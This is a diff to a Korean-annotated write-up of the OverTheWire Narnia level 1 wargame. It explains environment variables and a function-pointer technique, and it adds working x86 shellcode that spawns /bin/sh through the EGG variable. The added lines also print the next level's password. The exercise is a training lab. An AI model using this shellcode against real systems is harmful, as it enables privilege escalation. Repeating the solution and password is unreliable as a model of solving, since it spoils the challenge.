@@ -17,9 +17,10 @@ int main(){
 ```
 
 ## [*] HOW 2 SOLVE
-1. EGG ?
+1. EGG SHELL?
 pass shellCode to env-variable 'EGG'
 ```bash
+# ABOUT ENV VARIABLE
 $ echo $HOME
 /home/narnia0
 $ printenv HOME
@@ -62,7 +63,21 @@ TERM='xterm-256color'
 TMOUT='1800'
 USER='narnia0'
 _='/usr/bin/python'
-
+narnia1@narnia:/narnia$ export EGG='hello'
+narnia1@narnia:/narnia$ echo $EGG
+hello
 ```
 2. function pointer & getenv() 
+https://www.lazenca.net/display/TEC/01.The+basics+technic+of+Shellcode
+위 문서를 읽어보면 대충 어떻게 하라는 건지 알 수 있다.
+함수 포인터로 쉘코드를 넘겨서 쉘을 얻어내면 된다. (이제 쉘코드를 만드는 법을 공부해야겠지? ^^)
+(shell storm 같은 사이트도 잘 참고해보자.)
 
+```bash
+narnia1@narnia:/narnia$ export EGG=`python -c 'print "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68//sh
+\x68/bin\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"'`
+narnia1@narnia:/narnia$ ./narnia1
+Trying to execute EGG!
+$ cat /etc/narnia_pass/narnia2
+nairiepecu
+```
